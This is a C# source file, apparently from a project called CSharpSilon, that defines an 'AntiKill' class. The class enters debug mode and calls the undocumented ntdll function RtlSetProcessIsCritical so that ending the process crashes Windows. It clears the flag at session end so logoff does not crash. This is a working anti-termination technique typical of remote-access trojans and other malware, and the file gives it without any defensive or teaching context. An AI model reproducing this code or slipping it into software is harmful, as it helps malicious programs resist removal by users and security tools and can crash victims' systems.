using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace CSharpSilon.Utils
{
    public class AntiKill
    {
        [DllImport("NTdll.dll", EntryPoint = "RtlSetProcessIsCritical", SetLastError = true)]
        public static extern void SetCurrentProcessIsCritical([MarshalAs(UnmanagedType.Bool)] bool isCritical, [MarshalAs(UnmanagedType.Bool)] ref bool refWasCritical, [MarshalAs(UnmanagedType.Bool)] bool needSystemCriticalBreaks);

        public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            Disable();
        }
        
        
        public static void Enable()
        {
            try
            {
                SystemEvents.SessionEnding += SystemEvents_SessionEnding;
                Process.EnterDebugMode();
                bool tog = false;
                SetCurrentProcessIsCritical(true, ref tog, false);
            }
            catch { }
        }
        
        public static void Disable()
        {
            try
            {
                bool tog = false;
                SetCurrentProcessIsCritical(false, ref tog, false);
            }
            catch { }
        }
    }
}